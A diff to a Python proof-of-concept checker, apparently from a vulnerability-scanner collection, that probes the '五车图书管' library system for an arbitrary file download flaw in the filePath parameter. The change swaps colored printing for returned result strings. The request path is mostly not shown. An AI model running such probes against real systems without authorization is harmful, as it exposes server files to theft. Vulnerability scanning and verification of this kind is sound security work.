@@ -8,8 +8,8 @@ description: /5clib/kinweblistaction.action文件中,参数filePath未过滤存�
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class clib_kinweblistaction_download_BaseVerify():
     def __init__(self, url):
@@ -25,12 +25,12 @@ class clib_kinweblistaction_download_BaseVerify():
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
 
             if r"support" in req.text and r"MPEGVideo" in req.text:
-                cprint("[+]存在五车图书管系统任意下载漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在五车图书管系统任意下载漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = clib_kinweblistaction_download_BaseVerify(sys.argv[1])
     testVuln.run()
